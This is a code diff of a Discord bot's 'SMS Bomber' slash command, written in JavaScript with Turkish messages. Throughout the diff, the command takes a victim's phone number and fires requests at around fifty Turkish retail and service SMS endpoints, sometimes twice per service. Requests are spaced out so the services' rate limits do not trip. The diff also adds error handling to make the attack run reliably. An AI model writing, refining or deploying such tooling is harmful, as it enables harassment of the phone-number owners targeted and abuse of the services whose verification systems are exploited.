@@ -42,9 +42,15 @@ module.exports = {
     run: async (client, interaction, args) => {
         const config = client.config;
 
-        if (!interaction.member.roles.cache.has(config.gerekliRolId)) {
+        // Rol kontrolü
+        if (!interaction.member || !interaction.member.roles.cache.has(config.gerekliRolId)) {
             return interaction.reply({
-                embeds: [new MessageEmbed().setAuthor({ name: "Hata!", iconURL: interaction.user.displayAvatarURL({ dynamic: true }) }).setDescription("Bu komutu kullanmak için gerekli role sahip değilsin!").setColor("RED")],
+                embeds: [
+                    new MessageEmbed()
+                        .setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true }))
+                        .setDescription("Bu komutu kullanmak için gerekli role sahip değilsin!")
+                        .setColor("RED")
+                ],
                 ephemeral: true
             });
         }
@@ -58,11 +64,27 @@ module.exports = {
         const beklelan = db.get(`smscool_${interaction.user.id}`);
         if (beklelan !== null && timeout - (Date.now() - beklelan) > 0) {
             const timeLeft = ms(timeout - (Date.now() - beklelan));
-            return interaction.reply({ embeds: [new MessageEmbed().setAuthor({ name: "Hata!", iconURL: interaction.user.displayAvatarURL({ dynamic: true }) }).setDescription(`Bu komutu tekrar kullanmak için **${timeLeft.seconds}** saniye bekle!`).setColor("RED")], ephemeral: true });
+            return interaction.reply({
+                embeds: [
+                    new MessageEmbed()
+                        .setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true }))
+                        .setDescription(`Bu komutu tekrar kullanmak için **${timeLeft.seconds}** saniye bekle!`)
+                        .setColor("RED")
+                ],
+                ephemeral: true
+            });
         }
 
         if (!regex.test(tel)) {
-            return interaction.reply({ embeds: [new MessageEmbed().setAuthor({ name: "Hata!", iconURL: interaction.user.displayAvatarURL({ dynamic: true }) }).setDescription("Geçersiz telefon numarası! Numarayı 10 haneli ve 5 ile başlayacak şekilde girin. Örnek: 5551234567").setColor("RED")], ephemeral: true });
+            return interaction.reply({
+                embeds: [
+                    new MessageEmbed()
+                        .setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true }))
+                        .setDescription("Geçersiz telefon numarası! Numarayı 10 haneli ve 5 ile başlayacak şekilde girin. Örnek: 5551234567")
+                        .setColor("RED")
+                ],
+                ephemeral: true
+            });
         }
 
         // Defer reply for long-running task
@@ -70,13 +92,20 @@ module.exports = {
 
         // Edit reply to show the attack is starting
         await interaction.editReply({
-            embeds: [new MessageEmbed().setAuthor({ name: "Başlatılıyor...", iconURL: interaction.user.displayAvatarURL({ dynamic: true }) }).setDescription(`✅ SMS Bomber saldırısı başlatılıyor! \n\n📱 **Hedef Numara:** ||**${tel}**|| \n🎯 **Gönderim Modu:** ${gonderim === 'tekli' ? "Tekli Gönderim" : "Çift Gönderim"}`).setColor("GREEN")]
+            embeds: [
+                new MessageEmbed()
+                    .setAuthor("Başlatılıyor...", interaction.user.displayAvatarURL({ dynamic: true }))
+                    .setDescription(`✅ SMS Bomber saldırısı başlatılıyor! \n\n📱 **Hedef Numara:** ||**${tel}**|| \n🎯 **Gönderim Modu:** ${gonderim === 'tekli' ? "Tekli Gönderim" : "Çift Gönderim"}`)
+                    .setColor("GREEN")
+            ]
         });
 
         // Log channel message
         if (config.log && config.logKanalId) {
             const logChannel = client.channels.cache.get(config.logKanalId);
-            if(logChannel) logChannel.send(`<@${interaction.user.id}> - **${interaction.user.tag}** (**${interaction.user.id}**) adlı kullanıcı SMS Bomber komutunu kullandı.\n**Numara:** ||${tel}||\n**Gönderim Modu:** ${gonderim === 'tekli' ? "Tekli Gönderim" : "Çift Gönderim"}`);
+            if (logChannel) {
+                logChannel.send(`<@${interaction.user.id}> - **${interaction.user.tag}** (**${interaction.user.id}**) adlı kullanıcı SMS Bomber komutunu kullandı.\n**Numara:** ||${tel}||\n**Gönderim Modu:** ${gonderim === 'tekli' ? "Tekli Gönderim" : "Çift Gönderim"}`);
+            }
         }
 
         db.set(`smscool_${interaction.user.id}`, Date.now());
@@ -86,24 +115,44 @@ module.exports = {
         const services = ['kahveDunyasi', 'wmf', 'bim', 'englishHome', 'icq', 'suIste', 'kimGb', 'tazi', 'hey', 'biSu', 'ucDortBes', 'macro', 'tiklaGelsin', 'altinYildiz', 'naosStars', 'isteGelsin', 'hayatSu', 'evIdea', 'koton', 'hizliEcza', 'metro', 'qumpara', 'ipragaz', 'migros', 'paybol', 'fileMarket', 'joker', 'akasya', 'akbati', 'clickMe', 'happy', 'komagene', 'kuryemGelsin', 'porty', 'taksim', 'tasdelen', 'tasimacim', 'uysal', 'yapp', 'yilmazTicaret', 'yuffi', 'starbucks', 'pidem', 'baydoner', 'frink', 'bodrum', 'dominos', 'hoplaGit', 'n11'];
 
         const runAttack = async () => {
-            const attackPromises = [];
-            const loopCount = gonderim === 'cift' ? 2 : 1;
+            try {
+                const attackPromises = [];
+                const loopCount = gonderim === 'cift' ? 2 : 1;
 
-            for (let i = 0; i < loopCount; i++) {
-                for (const service of services) {
-                    attackPromises.push(sms[service]());
-                    // Servisler arası bekleme süresi ekleyerek rate-limit yeme olasılığını azalt
-                    await new Promise(resolve => setTimeout(resolve, 150));
+                for (let i = 0; i < loopCount; i++) {
+                    for (const service of services) {
+                        // Başlatılan her servis çağrısını promise olarak ekle
+                        // Eğer sms[service] bir async fonksiyon ise parantezlerle çağırıyoruz
+                        if (typeof sms[service] === 'function') {
+                            attackPromises.push(sms[service]());
+                        }
+                        // Servisler arası bekleme süresi ekleyerek rate-limit yeme olasılığını azalt
+                        await new Promise(resolve => setTimeout(resolve, 150));
+                    }
+                }
+
+                await Promise.all(attackPromises);
+
+                // Saldırı bitince mesajı güncelle
+                await interaction.editReply({ content: "✅ Saldırı tamamlandı.", embeds: [] });
+            } catch (err) {
+                console.error("runAttack error:", err);
+                // Hata durumunda kullanıcıya bilgi ver
+                try {
+                    await interaction.editReply({
+                        embeds: [
+                            new MessageEmbed()
+                                .setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true }))
+                                .setDescription("Saldırı sırasında bir hata oluştu. Lütfen daha sonra tekrar deneyin.")
+                                .setColor("RED")
+                        ]
+                    });
+                } catch (e) {
+                    console.error("editReply error:", e);
                 }
             }
-            
-            await Promise.all(attackPromises);
-
-            // Saldırı bitince mesajı güncelle
-            await interaction.editReply({ content: "✅ Saldırı tamamlandı.", embeds: [] });
         };
-        
-        runAttack().catch(console.error);
+
+        runAttack().catch(err => console.error("runAttack outer catch:", err));
     },
 };
-                          
